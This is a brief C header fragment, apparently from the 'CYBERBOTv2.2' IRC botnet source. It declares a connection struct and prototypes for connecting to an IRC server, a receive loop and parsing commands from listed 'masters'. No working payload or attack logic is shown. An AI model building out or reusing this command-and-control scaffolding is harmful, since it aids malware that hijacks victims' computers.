// CYBERBOTv2.2-Stable.m0dd[ownz.DreamWoRK]
typedef struct IRC 
{
	SOCKET sock;
	char host[128];
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	int port;
	int spy;
	int threadnum;
	BOOL gotinfo;

} IRC;

DWORD WINAPI irc_connect(LPVOID param);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy);
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy);
